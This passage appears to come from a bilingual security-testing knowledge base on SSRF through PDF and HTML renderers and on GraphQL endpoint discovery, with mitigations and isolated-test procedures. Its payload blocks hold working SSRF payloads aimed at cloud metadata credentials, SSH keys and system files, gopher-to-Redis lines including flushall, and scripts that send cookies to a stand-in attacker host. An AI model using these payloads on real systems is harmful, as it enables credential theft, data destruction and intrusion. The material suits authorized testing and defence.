<iframe src="http://127.0.0.1:6379/"></iframe>
<iframe src="http://127.0.0.1:27017/"></iframe>
<iframe src="http://127.0.0.1:9200/"></iframe>
<iframe src="http://localhost/"></iframe>
<iframe src="http://0.0.0.0/"></iframe>
<iframe src="http://[::1]/"></iframe>
<iframe src="http://169.254.169.254/latest/meta-data/"></iframe>
<iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/"></iframe>
<iframe src="http://169.254.169.254/latest/user-data/"></iframe>
<iframe src="http://192.168.1.1/"></iframe>
<iframe src="http://10.0.0.1/"></iframe>
<iframe src="http://172.16.0.1/"></iframe>
<iframe src="file:///etc/passwd"></iframe>
<iframe src="file:///flag"></iframe>
<iframe src="file:///flag.txt"></iframe>
<iframe src="file:///proc/self/environ"></iframe>
<iframe src="file:///proc/self/cmdline"></iframe>
<iframe src="file:///proc/version"></iframe>
<iframe src="file:///proc/cpuinfo"></iframe>
<iframe src="file:///etc/hostname"></iframe>
<iframe src="file:///etc/hosts"></iframe>
<iframe src="file:///root/.bash_history"></iframe>
<iframe src="file:///root/.ssh/id_rsa"></iframe>
<iframe src="file:///var/www/html/config.php"></iframe>
<iframe src="file:///c:/windows/system32/drivers/etc/hosts"></iframe>
<iframe src="file:///c:/windows/win.ini"></iframe>

description.zh: 部署协议和地址限制后重放，确认受控公共资源可用且内网和本地文件访问均被阻断。
description.en: Replay after scheme and destination restrictions to preserve controlled public resources while blocking internal and local-file access.

review.rationale: 最终请求由服务端 PDF 渲染进程发起，应保留 SSRF，并把 file: 影响明确为本地文件读取。

prerequisites.zh: 用户 HTML 由已确认版本的 wkhtmltopdf 在服务器网络位置渲染，资源加载、本地文件访问和 JavaScript 开关可观察。
prerequisites.en: User HTML is rendered by a confirmed wkhtmltopdf version from the server network position, with resource loading, local-file access, and JavaScript settings observable.

prerequisites.zh: 回环/私网/file 目标全部替换为隔离 HTTP listener 和 renderer 沙箱 marker 文件，每个资源使用唯一 token 并保存 PDF 对象与网络/文件审计。
prerequisites.en: Loopback, private, and file targets are replaced by an isolated HTTP listener and renderer-sandbox marker file, with unique tokens and preserved PDF objects plus network and file audit.

analysis.zh: 阳性证据是 wkhtmltopdf 进程因渲染任务访问隔离 URL 或 marker 文件，并将预期 marker/资源特征带入 PDF；任务、连接和产物关联。 假阳性边界：HTML 包含 iframe、PDF 出现空框、DNS 查询、客户端浏览器请求、资源错误、路径文字回显或只检测到 wkhtmltopdf 版本均不能证明 SSRF/读取。
analysis.en: Positive evidence requires the wkhtmltopdf process to access the isolated URL or marker file because of the render job and carry the expected marker or resource fingerprint into the PDF, correlating job, connection, and artifact. False-positive boundary: An iframe in HTML, an empty PDF frame, DNS only, client-browser requests, resource errors, reflected path text, or wkhtmltopdf version detection does not prove SSRF or reading.

opsecTips.zh: wkhtmltopdf 测试禁止云元数据、真实内网和系统文件；出现非隔离连接、响应数据超出 marker、端口扩散、渲染挂起或 worker 压力时停止。
opsecTips.en: wkhtmltopdf testing forbids cloud metadata, real internal networks, and system files; stop on nonisolated connections, data beyond the marker, port expansion, render hangs, or worker pressure.

opsecTips.zh: 删除 HTML/PDF/marker 和渲染临时目录，关闭 listener，清理任务/字体/资源缓存与日志，并重启隔离 renderer。
opsecTips.en: Delete HTML, PDF, markers, and render temporary directories, close listeners, clear job, font, and resource caches plus logs, and restart isolated renderers.

name.zh: wkhtmltopdf gopher 协议 SSRF

description.zh: 验证 wkhtmltopdf 是否允许 gopher: 资源访问内网服务，并向 Redis、数据库或其他 TCP 端口发送攻击者构造的协议字节。
description.en: Tests whether wkhtmltopdf permits gopher resources to reach internal services and send attacker-crafted protocol bytes to Redis, databases, or other TCP ports.

subCategory.zh: 渲染器非 HTTP 协议 SSRF

overview.zh: gopher: 载荷将 SSRF 从 HTTP GET 扩展到可控 TCP 字节，原集合涉及 Redis 与多个数据库端口。测试应使用隔离模拟服务，尤其不能把 flushall 等破坏性片段发送到真实共享 Redis。
overview.en: Gopher inputs extend SSRF from HTTP GET to attacker-controlled TCP bytes, and the source covers Redis and several database ports. Testing must use isolated mock services, especially because destructive fragments such as flushall must never be sent to a shared Redis instance.

vulnerability.zh: 若渲染器或其 URL 库允许非业务协议，且网络层可到达内网服务，攻击者可以把 HTML 资源 URL 变成任意协议客户端。端口可连接或渲染失败只表示网络行为，只有模拟服务收到预期解码字节才证明协议级 SSRF。
vulnerability.en: If the renderer or URL library permits nonbusiness schemes and can reach internal services, an HTML resource URL can become an arbitrary protocol client. A reachable port or failed render shows only network behavior; protocol-level SSRF requires the mock service to receive the expected decoded bytes.

exploitation.zh: 步骤一在隔离网络启动只记录字节的 Redis/TCP 模拟器并建立普通 HTTP 资源基线；步骤二回放原始 gopher 集合，保存渲染器连接、URL 解码后字节和模拟器会话；步骤三禁用 gopher 并阻断内网网段后复测，排除 DNS 探测、端口扫描或渲染超时造成的假阳性。
exploitation.en: First start a byte-recording Redis or TCP simulator in an isolated network and establish a normal HTTP-resource baseline. Replay the original gopher set and preserve renderer connections, URL-decoded bytes, and simulator sessions. Disable gopher and block internal ranges before replaying to exclude DNS probes, port scans, or render timeouts as false positives.

mitigation.zh: 在解析器入口只允许 http/https 且拒绝协议混淆；在网络层阻断渲染容器到私网、回环和管理端口；对 URL 解码后目标再次校验，并以只读、无凭据的独立渲染沙箱运行。
mitigation.en: Allow only HTTP and HTTPS at parser entry and reject scheme confusion. Block renderer-container access to private, loopback, and management ports at the network layer. Revalidate destinations after URL decoding and run rendering in an isolated read-only sandbox without credentials.

title.zh: 部署字节记录模拟服务

description.zh: 在隔离网段准备无状态 TCP 服务，记录连接来源、端口和完整接收字节。
description.en: Prepare a stateless TCP service in an isolated network and record connection source, port, and complete received bytes.

title.zh: 回放 gopher 协议字节

description.zh: 提交原始 gopher 资源并比较 URL 解码结果与模拟服务实际收到的协议内容。
description.en: Submit the original gopher resources and compare URL-decoded data with protocol content received by the mock service.

attackChain.payload:
<iframe src="gopher://127.0.0.1:6379/_INFO%0d%0a"></iframe>
<iframe src="gopher://127.0.0.1:6379/_*1%0d%0a%0d%0aINFO%0d%0a"></iframe>
<iframe src="gopher://127.0.0.1:6379/_*1%0d%0a%0d%0aflushall%0d%0a"></iframe>
<iframe src="gopher://127.0.0.1:3306/_"></iframe>
<iframe src="gopher://127.0.0.1:27017/_"></iframe>
<iframe src="gopher://127.0.0.1:5432/_"></iframe>
<iframe src="gopher://127.0.0.1:9000/_"></iframe>

description.zh: 仅允许公共 HTTP/HTTPS 并阻断内网后重放，确认正常渲染保留且模拟器不再收到连接。
description.en: Replay after allowing only public HTTP and HTTPS and blocking internal egress, preserving normal rendering without mock-service connections.

review.rationale: gopher 由服务端渲染器发起并可携带协议字节，属于非 HTTP SSRF；教程明确要求模拟服务避免破坏真实数据。

prerequisites.zh: 目标 wkhtmltopdf/Qt 网络栈实际支持 gopher:，渲染资源可到达隔离 TCP listener，协议和版本能力已先确认。
prerequisites.en: The target wkhtmltopdf and Qt network stack actually supports gopher:, and render resources can reach an isolated TCP listener, with protocol and version capability confirmed first.

prerequisites.zh: Redis/数据库目标替换为只记录原始字节且不执行命令的自有 TCP sink，使用唯一 token 和一次短连接；flushall 等破坏行不执行。
prerequisites.en: Redis and database targets are replaced by an owned TCP sink that records raw bytes without executing commands, using a unique token and one short connection; destructive lines such as flushall are not executed.

analysis.zh: 阳性证据是 wkhtmltopdf 进程解析 gopher URI 并向隔离 sink 发送与编码载荷一致的 token 字节，连接源、任务和字节流相互对应。 假阳性边界：gopher 字符串被接受、Qt 报不支持、DNS/连接尝试无字节、TCP sink 收到扫描流量、PDF 错误或 Redis 命令语法存在均不是协议 SSRF。
analysis.en: Positive evidence requires the wkhtmltopdf process to parse the gopher URI and send token bytes matching the encoded payload to the isolated sink, correlating connection source, job, and byte stream. False-positive boundary: Accepted gopher text, an unsupported-scheme error, DNS or connection attempts without bytes, scanner traffic at the sink, PDF errors, or valid Redis command syntax does not prove protocol SSRF.

opsecTips.zh: gopher 测试只发送无害 token，禁止 INFO/flushall/数据库协议和真实端口；出现非测试字节、服务响应、持久连接、端口扫描或渲染异常时停止。
opsecTips.en: Gopher testing sends a harmless token only and forbids INFO, flushall, database protocols, and real ports; stop on nontest bytes, service responses, persistent connections, port scanning, or render anomalies.

opsecTips.zh: 关闭 TCP sink 和连接，删除 HTML/PDF/token，清理渲染任务与网络日志，重启 renderer 并确认无延迟重试。
opsecTips.en: Close the TCP sink and connections, delete HTML, PDF, and tokens, clear render jobs and network logs, restart the renderer, and confirm no delayed retries.

name.zh: Headless Chrome 脚本驱动 SSRF

description.zh: 验证 Puppeteer 或 Headless Chrome 渲染攻击者 HTML 时，页面脚本能否从服务器网络位置访问内网、元数据或本地资源并外传结果。
description.en: Tests whether attacker HTML rendered by Puppeteer or Headless Chrome can use page scripts from the server's network position to access internal, metadata, or local resources and exfiltrate results.

overview.zh: 原集合用 fetch、XMLHttpRequest、sendBeacon 和导航组合测试无头浏览器。脚本执行是触发机制，最终安全边界是服务端浏览器对内网资源的请求以及可能的外传；必须区分浏览器同源策略阻断、网络请求发出和响应内容可读。
overview.en: The source combines fetch, XMLHttpRequest, sendBeacon, and navigation in a headless browser. Script execution is the trigger; the final boundary is server-side browser access to internal resources and possible exfiltration. Distinguish same-origin blocking, request transmission, and readable response data.

vulnerability.zh: 应用允许不可信 HTML/JavaScript 在带服务器网络权限、Cookie 或云身份的浏览器中运行，且缺少请求拦截、地址过滤和沙箱隔离。即便 CORS 阻止读取，盲请求、导航和时间侧信道仍可能存在，但不能把每次 console 错误都当成 SSRF。
vulnerability.en: The application runs untrusted HTML or JavaScript in a browser carrying server network reachability, cookies, or cloud identity without request interception, destination filtering, or sandbox isolation. CORS may block reads while blind requests, navigation, and timing remain possible, but console errors alone are not SSRF.

exploitation.zh: 步骤一用受控公共源记录无头浏览器 User-Agent、Origin、CORS 与外传基线；步骤二回放原始脚本并关联 CDP 网络事件、内网模拟服务和受控接收端数据；步骤三禁用页面脚本或启用请求拦截后复测，排除测试者浏览器、截图预加载和 DNS 扫描造成的假阳性。
exploitation.en: First use a controlled public origin to record headless User-Agent, Origin, CORS, and exfiltration behavior. Replay the original scripts and correlate CDP network events, an internal mock service, and data at a controlled receiver. Replay with page scripting disabled or request interception enabled to exclude the tester's browser, screenshot preloading, and DNS scans as false positives.

mitigation.zh: 在隔离网络与临时无凭据浏览器配置中渲染；通过请求拦截只允许明确公共域并在每次重定向和 DNS 解析后复核地址；默认禁用不需要的 JavaScript、文件协议与导航，并限制输出和运行时间。
mitigation.en: Render in an isolated network with an ephemeral credential-free browser profile. Intercept requests to allow only explicit public domains and recheck after every redirect and DNS resolution. Disable unneeded JavaScript, file schemes, and navigation by default, and bound output and runtime.

description.zh: 使用受控资源保存 CDP 请求、Origin、User-Agent 和渲染任务 ID 的正常基线。
description.en: Use a controlled resource to preserve normal CDP requests, Origin, User-Agent, and render job identifiers.

description.zh: 回放原始脚本并关联内网模拟器、浏览器网络事件和受控外传接收端。
description.en: Replay the original scripts and correlate the internal simulator, browser network events, and controlled exfiltration receiver.

attackChain.payload:
<script>fetch('http://169.254.169.254/latest/meta-data/').then(r=>r.text()).then(t=>document.title=t)</script>
<script>fetch('http://127.0.0.1/').then(r=>r.text()).then(t=>document.title=t)</script>
<script>fetch('file:///etc/passwd').then(r=>r.text()).then(t=>document.title=t)</script>
<script>var x=new XMLHttpRequest();x.open('GET','http://127.0.0.1/',false);x.send();document.title=x.responseText</script>
<script>var x=new XMLHttpRequest();x.open('GET','file:///etc/passwd',false);x.send();document.title=x.responseText</script>
<script>var x=new XMLHttpRequest();x.open('GET','http://169.254.169.254/latest/meta-data/',false);x.send();document.title=x.responseText</script>
<script>navigator.sendBeacon('http://ATTACKER/',document.cookie)</script>
<script>window.location='http://ATTACKER/?c='+document.cookie</script>
<script>new Image().src='http://ATTACKER/?c='+document.cookie</script>

description.zh: 部署逐请求地址校验和隔离网络后复测，确认允许资源可渲染且内网请求与外传均消失。
description.en: Retest with per-request destination checks and network isolation to preserve allowed rendering while eliminating internal access and exfiltration.

review.rationale: 原集合同时包含服务端无头浏览器的 HTTP 内部读取、file URI 本地读取与 Cookie 外传三种不同数据流和证据标准，必须拆分。

prerequisites.zh: 攻击者 HTML/脚本由服务端 Puppeteer/Headless Chrome 执行，浏览器网络命名空间、页面脚本权限、CORS 和 request interception 已确认。
prerequisites.en: Attacker HTML or script is executed by server-side Puppeteer or Headless Chrome, with browser network namespace, page-script permissions, CORS, and request interception confirmed.

prerequisites.zh: 元数据/回环/file 目标替换为隔离 HTTP marker endpoint 和浏览器沙箱资源，DevTools Protocol 记录 initiator、response、document.title 与任务 ID。
prerequisites.en: Metadata, loopback, and file targets are replaced by an isolated HTTP marker endpoint and browser-sandbox resource, while DevTools Protocol records initiator, response, document.title, and job identifier.

analysis.zh: 阳性证据是 Headless Chrome 页面脚本从服务器网络发起请求并读取隔离 marker 响应，随后通过页面/PDF 中固定 canary 证明响应可被脚本消费。 假阳性边界：浏览器仅发请求但 CORS 阻止读取、DNS 查询、客户端 Chrome 流量、document.title 由输入直接设置、file fetch 被 scheme 限制或网络日志无任务关联均不是完整链。
analysis.en: Positive evidence requires Headless Chrome page script to request and read the isolated marker response from the server network and prove script consumption through a fixed canary in the page or PDF. False-positive boundary: A request whose response is blocked by CORS, DNS only, client Chrome traffic, document.title set directly by input, scheme-blocked file fetch, or network logs without job correlation does not prove the complete chain.

opsecTips.zh: Headless Chrome SSRF 禁止元数据/真实内网/文件，且不外传响应；出现非隔离目标、认证头、下载、浏览器持久 profile 污染或任务逃逸时停止。
opsecTips.en: Headless Chrome SSRF forbids metadata, real internal networks, and files and never exfiltrates responses; stop on nonisolated targets, authentication headers, downloads, persistent-profile contamination, or job escape.

opsecTips.zh: 关闭页面/browser context 和 listeners，删除 HTML/PDF/marker/profile，清理 Chromium cache/service worker/任务日志并终止进程树。
opsecTips.en: Close pages, browser contexts, and listeners, delete HTML, PDF, markers, and profiles, clear Chromium caches, service workers, and job logs, and terminate the process tree.

name.zh: WeasyPrint CSS/SVG 资源 SSRF
name.en: WeasyPrint CSS and SVG Resource SSRF

description.zh: 验证 WeasyPrint 渲染用户 HTML 时是否通过样式表或 SVG 图片引用访问回环地址和本地文件，并把结果写入 PDF。
description.en: Tests whether WeasyPrint rendering of user HTML accesses loopback URLs or local files through stylesheets or SVG image references and writes the result into a PDF.

subCategory.zh: CSS 与 SVG 渲染资源加载
subCategory.en: CSS and SVG Renderer Resource Loading

overview.zh: WeasyPrint 会解析 HTML、CSS 和部分 SVG 资源，原集合分别测试 stylesheet 与 image 引用。与浏览器 XSS 不同，这里的核心是渲染进程从服务器环境发起资源请求或读取 file:，通常没有页面脚本执行前提。
overview.en: WeasyPrint parses HTML, CSS, and selected SVG resources, and the source tests both stylesheet and image references. Unlike browser XSS, the core issue is resource retrieval or file access from the server-side renderer, usually without page-script execution.

vulnerability.zh: 应用若把不可信标记直接交给默认 URL fetcher，未限制 scheme、重定向、DNS 结果和本地路径，渲染器会继承宿主网络与文件权限。资源加载失败、空白图片或 CSS 未应用都不能证明目标内容已读取。
vulnerability.en: If an application sends untrusted markup to the default URL fetcher without restricting schemes, redirects, DNS results, and local paths, the renderer inherits host network and file privileges. A failed resource, blank image, or unapplied stylesheet does not prove content was read.

exploitation.zh: 步骤一用带唯一样式或图像的受控公共资源建立 fetcher 与 PDF 输出基线；步骤二回放原始 link 和 SVG 载荷，关联服务端回调、渲染日志和 PDF 中唯一内容；步骤三换用受限 url_fetcher 并禁用 file: 后复测，排除客户端下载预览、缓存和替代文本造成的假阳性。
exploitation.en: First use a controlled public resource with unique style or image content to establish fetcher and PDF-output behavior. Replay the original link and SVG inputs and correlate server callbacks, render logs, and unique PDF content. Retest with a restricted url_fetcher and file disabled to exclude client download previews, cache, and alternate text as false positives.

mitigation.zh: 实现只允许业务域和 http/https 的自定义 url_fetcher；在 DNS 与重定向后阻断回环、链路本地和私网地址，并拒绝 file:；将渲染进程置于无凭据、只读文件系统和受限网络容器。
mitigation.en: Implement a custom url_fetcher that allows only business domains over HTTP or HTTPS. Block loopback, link-local, and private addresses after DNS and redirects and reject file. Place the renderer in a credential-free container with a read-only filesystem and restricted network.

title.zh: 建立 WeasyPrint fetcher 基线

description.zh: 加载受控公共 CSS 和 SVG，记录渲染任务来源、请求头以及 PDF 中的唯一标记。
description.en: Load controlled public CSS and SVG resources and record render-job origin, request headers, and unique PDF markers.

title.zh: 回放 CSS/SVG 内部资源
title.en: Replay internal CSS and SVG resources

description.zh: 提交原始资源引用并分别确认网络回调、本地文件访问与最终 PDF 内容。
description.en: Submit the original resource references and verify network callbacks, local-file access, and final PDF content separately.

attackChain.payload:
<link rel="stylesheet" href="http://127.0.0.1/">
<link rel="stylesheet" href="file:///etc/passwd">
<svg xmlns="http://www.w3.org/2000/svg"><image href="http://127.0.0.1/"/></svg>
<svg xmlns="http://www.w3.org/2000/svg"><image href="file:///etc/passwd"/></svg>

description.zh: 限制协议、域名和地址后重放，确认允许样式正常而回环和 file: 请求被阻断。
description.en: Replay after scheme, domain, and address restrictions to preserve allowed styles while blocking loopback and file requests.

review.rationale: CSS/SVG 虽共享 WeasyPrint fetcher，但 HTTP 出站与 file URI 本地文件读取具有不同权限、证据和缓解边界，需按 scheme 拆分。

prerequisites.zh: 用户 HTML 由服务端 WeasyPrint 解析，CSS/SVG URL fetcher 和 file URI 策略可观察，渲染 worker 网络/文件权限已确认。
prerequisites.en: User HTML is parsed by server-side WeasyPrint, with CSS or SVG URL fetcher and file-URI policy observable and render-worker network and file permissions confirmed.

prerequisites.zh: stylesheet/SVG/file 引用只指向隔离 marker endpoint 或 worker 沙箱文件，每种资源唯一 token，保存 url_fetcher 日志和 PDF 对象。
prerequisites.en: Stylesheet, SVG, and file references point only to an isolated marker endpoint or worker-sandbox file, with unique tokens and preserved url_fetcher logs and PDF objects.

analysis.zh: 阳性证据是 WeasyPrint url_fetcher 因特定 CSS/SVG 资源读取隔离 marker，并将其样式/图像/文本特征写入生成 PDF，任务链可对应。 假阳性边界：link/svg 标签存在、资源 URL 出现在 PDF metadata、fetch error、空图像、客户端请求、file URI 被拒绝或只发 DNS 都不能证明读取。
analysis.en: Positive evidence requires WeasyPrint's URL fetcher to read the isolated marker because of a specific CSS or SVG resource and place its style, image, or text fingerprint into the generated PDF, correlating the job chain. False-positive boundary: A link or SVG tag, resource URLs in PDF metadata, fetch errors, blank images, client requests, rejected file URIs, or DNS only does not prove reading.

opsecTips.zh: WeasyPrint 测试禁止系统文件/内网/元数据；出现非 marker 内容、跨网段请求、字体/图像放大、worker 资源增长或渲染失败风暴时停止。
opsecTips.en: WeasyPrint testing forbids system files, internal networks, and metadata; stop on non-marker content, cross-segment requests, font or image amplification, worker-resource growth, or render-failure storms.

opsecTips.zh: 删除 HTML/PDF/CSS/SVG/marker 和临时字体，关闭 endpoint，清理 url_fetcher/渲染缓存与任务日志并重启 worker。
opsecTips.en: Delete HTML, PDF, CSS, SVG, markers, and temporary fonts, close endpoints, clear URL-fetcher and render caches plus job logs, and restart workers.

name.zh: Prince XML 附件与对象资源 SSRF
name.en: Prince XML Attachment and Object Resource SSRF

description.zh: 验证 Prince XML 渲染用户标记时是否通过 attachment 或 object 资源从服务器读取回环地址与本地文件。
description.en: Tests whether Prince XML rendering of user markup retrieves loopback resources or local files through attachment or object elements from the server environment.

subCategory.zh: Prince XML 资源与附件加载
subCategory.en: Prince XML Resource and Attachment Loading

overview.zh: 原命令利用 Prince 支持的附件和对象引用，测试生成 PDF 时是否主动拉取 URL 或嵌入本地文件。链接文本本身不构成 SSRF，必须证明 Prince 进程而非用户浏览器发起请求，并确认资源进入输出或服务日志。
overview.en: The source uses Prince attachment and object references to test whether PDF generation actively retrieves a URL or embeds a local file. Link text alone is not SSRF; evidence must show that the Prince process, not the user's browser, made the request and that the resource reached output or server logs.

vulnerability.zh: 当应用允许用户控制 Prince 输入且未配置 URL 访问策略时，渲染器会继承服务端网络位置和文件权限。附件功能尤其可能把 file: 内容直接封装进 PDF；仅看到对象占位符或渲染错误不能确认读取成功。
vulnerability.en: When users control Prince input and no URL-access policy is enforced, the renderer inherits server network position and file privileges. Attachment support may package file content directly into the PDF; an object placeholder or render error does not confirm a successful read.

exploitation.zh: 步骤一用受控公共附件记录 Prince 请求特征、PDF 附件清单和哈希；步骤二回放原始 link/object 变体，关联回环模拟器、本地文件 Canary 与最终 PDF 对象；步骤三启用 URL 白名单并禁用本地文件后复测，排除客户端下载、旧 PDF 缓存或空附件造成的假阳性。
exploitation.en: First use a controlled public attachment to record Prince request traits, the PDF attachment list, and hashes. Replay the original link and object variants and correlate a loopback simulator, local-file canary, and final PDF objects. Retest with a URL allowlist and local files disabled to exclude client downloads, stale PDF cache, or empty attachments as false positives.

mitigation.zh: 只允许明确业务资源协议和域名；拒绝 file: 并在 DNS、重定向后阻断回环、链路本地与私网；在独立低权限容器中运行 Prince，使用只读临时目录并检查生成 PDF 的附件。
mitigation.en: Allow only explicit business schemes and domains. Reject file and block loopback, link-local, and private destinations after DNS and redirects. Run Prince in a separate least-privilege container with read-only temporary storage and inspect generated PDF attachments.

title.zh: 固定 Prince 附件基线

description.zh: 以受控公共文件记录渲染器请求来源、附件元数据、内容哈希和 PDF 结构。
description.en: Use a controlled public file to record renderer request origin, attachment metadata, content hash, and PDF structure.

description.zh: 回放原始 attachment/object 集合并关联模拟服务、文件 Canary 和生成 PDF。
description.en: Replay the original attachment and object set and correlate mock services, file canaries, and the generated PDF.

attackChain.payload:
<link rel="attachment" src="file:///etc/passwd">
<link rel="attachment" src="http://127.0.0.1/">
<object data="file:///etc/passwd">
<object data="http://127.0.0.1/">

title.zh: 限制 Prince URL 访问

description.zh: 部署协议、地址和文件策略后重放，确认授权附件保留且内部资源不再进入渲染结果。
description.en: Replay after scheme, address, and file policies to preserve authorized attachments while excluding internal resources from output.

review.rationale: Prince XML 的 attachment/object 由服务端渲染器取回，主分类是 SSRF，file: 内容则作为本地文件影响验证。

prerequisites.zh: 用户标记由服务器 Prince XML 处理，attachment、object 与 file/http 资源开关、许可证版本和 worker 权限已确认。
prerequisites.en: User markup is processed by server-side Prince XML, with attachment, object, file and HTTP resource settings, licensed version, and worker permissions confirmed.

prerequisites.zh: attachment/object 仅引用自有空 HTTP marker 或 Prince 沙箱文件，记录 Prince 日志、PDF 附件/对象表、文件审计与任务 token。
prerequisites.en: Attachment and object references use only an owned empty HTTP marker or Prince-sandbox file, recording Prince logs, PDF attachment or object tables, file audit, and job tokens.

analysis.zh: 阳性证据是 Prince 进程按特定 attachment/object 指令访问 marker 资源并将其作为附件或对象嵌入 PDF，源连接、任务与 PDF 结构一致。 假阳性边界：标签被保留、PDF 只有 URI 注释、附件列表为空、资源错误、客户端阅读器后续访问 URL、路径文字或 DNS 查询均不是服务端 SSRF。
analysis.en: Positive evidence requires Prince to access the marker resource because of the specific attachment or object directive and embed it in the PDF, with source connection, job, and PDF structure aligned. False-positive boundary: A retained tag, URI annotation only, empty attachment list, resource errors, later reader-side URL access, path text, or DNS query does not prove server-side SSRF.

opsecTips.zh: Prince XML 测试不附加真实文件或访问内网；出现非 marker 附件、认证信息、公共请求、大对象嵌入、文件写入或 worker 异常时停止。
opsecTips.en: Prince XML testing never attaches real files or accesses internal networks; stop on non-marker attachments, credentials, public requests, large embedded objects, file writes, or worker anomalies.

opsecTips.zh: 删除 HTML/PDF/附件/marker 和 Prince 临时目录，关闭 endpoint，清理渲染/字体/对象缓存和任务日志并重启 worker。
opsecTips.en: Delete HTML, PDF, attachments, markers, and Prince temporary directories, close endpoints, clear rendering, font, and object caches plus job logs, and restart workers.

name.zh: GraphQL 端点与控制台发现

description.zh: 枚举常见 GraphQL API、控制台、Schema 和内省路径，并验证发现的端点是否真实接受 GraphQL 请求。
description.en: Enumerates common GraphQL API, console, schema, and introspection paths and verifies whether discovered endpoints actually accept GraphQL requests.

overview.zh: 原内容是路径和查询候选清单，不是 SQL 注入。它用于定位 GraphQL HTTP 入口、开发控制台和 Schema 暴露面，后续还需发送最小合法查询确认协议，而不能仅凭 200、HTML 页面或路径名称下结论。
overview.en: The source is a path and query candidate list, not SQL injection. It locates GraphQL HTTP entry points, development consoles, and exposed schemas, after which a minimal valid query must confirm the protocol; a 200 response, HTML page, or path name alone is insufficient.

vulnerability.zh: GraphQL 端点本身不是漏洞；风险来自生产环境暴露调试 UI、未授权 Schema、敏感字段或缺少复杂度与字段级授权。发现阶段必须与身份、响应 Content-Type、GraphQL data/errors 结构和 resolver 行为结合。
vulnerability.en: A GraphQL endpoint is not itself a vulnerability. Risk comes from production debug UIs, unauthorized schema access, sensitive fields, or missing complexity and field-level authorization. Discovery must be combined with identity, response Content-Type, GraphQL data or errors structure, and resolver behavior.

exploitation.zh: 步骤一用不存在随机路径和普通 REST 路径建立路由基线；步骤二逐项请求原始候选，并向响应候选发送 query{__typename} 或等价最小查询；步骤三比较未认证与低权限身份下的 Schema 和字段结果，排除 SPA fallback、统一 200、WAF 品牌页或静态文档造成的假阳性。
exploitation.en: First establish routing baselines with a random nonexistent path and an ordinary REST path. Request each original candidate and send query{__typename} or an equivalent minimal query to responders. Compare schema and field results under anonymous and low-privilege identities to exclude SPA fallbacks, uniform 200 responses, WAF pages, or static documentation as false positives.

mitigation.zh: 只暴露业务需要的 GraphQL 路由并关闭生产调试控制台；对 Schema 与每个 resolver 执行认证和字段级授权；设置深度、复杂度、分页与速率限制，同时监控异常内省和路径枚举。
mitigation.en: Expose only required GraphQL routes and disable production debug consoles. Enforce authentication and field-level authorization on schema and every resolver. Apply depth, complexity, pagination, and rate limits and monitor unusual introspection and path enumeration.

description.zh: 用随机不存在路径、普通 API 和静态页面记录状态码、内容类型及响应指纹。
description.en: Use a random nonexistent path, ordinary API, and static page to record status, content type, and response fingerprints.

title.zh: 枚举并确认 GraphQL 协议

description.zh: 回放原始路径集合并对候选发送最小查询，验证 data/errors 与 GraphQL Content-Type。
description.en: Replay the original path set and send a minimal query to candidates, verifying data or errors and GraphQL content type.

attackChain.payload:
/graphql
/graphiql
/v1/graphql
/v2/graphql
/api/graphql
/api/v1/graphql
/api/v2/graphql
/query
/api/query
/gql
/api/gql
/graph
/api/graph
/graphql/console
/graphql/voyager
/graphql/playground
/graphql/altair
/graphql/explorer
/graphql/schema
/graphql/schema.json
/graphql/schema.graphql
/graphql/schema.sdl
/graphql/introspection
/graphql/__schema
/graphql/__type
/graphql?query={__schema{types{name}}}
/graphql?query={__type(name:"Query"){fields{name}}}
/graphql?query={__type(name:"Mutation"){fields{name}}}
/graphql?query={__type(name:"Subscription"){fields{name}}}

description.zh: 以匿名和低权限身份比较 Schema、控制台与字段访问，修复暴露后保留业务查询回归。
description.en: Compare schema, console, and field access anonymously and with low privilege, then preserve business-query regressions after remediation.

review.rationale: 路径清单用于 GraphQL API 攻击面发现，应从 SQL/NoSQL 注入迁到 API 安全，并明确端点存在不等于漏洞。

prerequisites.zh: 候选路径位于授权主机，能够通过 Content-Type、GraphQL 错误格式或最小 query 确认 endpoint，而非仅依赖常见路径状态码。
prerequisites.en: Candidate paths are on an authorized host and can be confirmed through Content-Type, GraphQL error format, or a minimal query rather than common-path status codes alone.

prerequisites.zh: 每个路径只发送一次 {__typename} 或等价无副作用请求，记录 HTTP method、认证身份、响应签名、控制台暴露和服务日志。
prerequisites.en: Each path receives one {__typename} or equivalent side-effect-free request, recording HTTP method, authentication identity, response signature, console exposure, and service logs.

analysis.zh: 阳性证据是候选路径实际解析 GraphQL 文档并返回符合规范的 data/errors 或由服务端 GraphQL handler 记录；控制台发现单独标记。 假阳性边界：路径返回 200 HTML、SPA fallback、Swagger/GraphiQL 静态资源、WAF JSON、404 差异、OPTIONS/CORS 或名称含 graphql 均不能确认 API。
analysis.en: Positive evidence requires a candidate path to parse a GraphQL document and return specification-shaped data or errors or be logged by the server's GraphQL handler; console discovery is labeled separately. False-positive boundary: An HTTP 200 HTML page, SPA fallback, Swagger or GraphiQL static assets, WAF JSON, 404 differences, OPTIONS or CORS, or graphql in a name does not confirm an API.

opsecTips.zh: GraphQL 发现只做单次无副作用 query，不枚举字段或触发 mutation/subscription；出现真实数据、深度/复杂度告警、速率限制或服务压力时停止。
opsecTips.en: GraphQL discovery uses one side-effect-free query and never enumerates fields or triggers mutations or subscriptions; stop on real data, depth or complexity alerts, rate limiting, or service pressure.

opsecTips.zh: 关闭测试会话和控制台，删除请求/响应副本与 token，清理 API gateway/GraphQL 日志缓存，并记录真实 endpoint 与废弃路径。
opsecTips.en: Close test sessions and consoles, delete request and response copies plus tokens, clear API-gateway and GraphQL log caches, and record active endpoints and retired paths.

name.zh: GraphQL Schema 内省查询

description.zh: 使用 __schema 与 __type 查询枚举 GraphQL 类型、字段、参数和指令，并验证不同身份下的 Schema 暴露边界。
description.en: Uses __schema and __type queries to enumerate GraphQL types, fields, arguments, and directives and test schema-exposure boundaries across identities.

subCategory.zh: GraphQL 内省与 Schema 暴露

overview.zh: 该异常短 ID 对应的真实内容是完整 GraphQL 内省集合。内省是开发与工具生态的正常功能，测试目标不是看到 __schema 就报漏洞，而是确认生产策略、身份边界和返回字段是否与设计一致。
overview.en: This unusually short ID maps to a complete GraphQL introspection set. Introspection is normal for development and tooling; the goal is not to report any __schema response, but to verify production policy, identity boundaries, and returned fields against design.

vulnerability.zh: 生产 API 若向未授权用户公开包含内部管理类型、弃用字段或敏感操作的完整 Schema，会降低攻击成本；但关闭内省不能替代 resolver 授权。真实问题应表现为超出预期的 Schema 暴露或随后可访问的未授权字段。
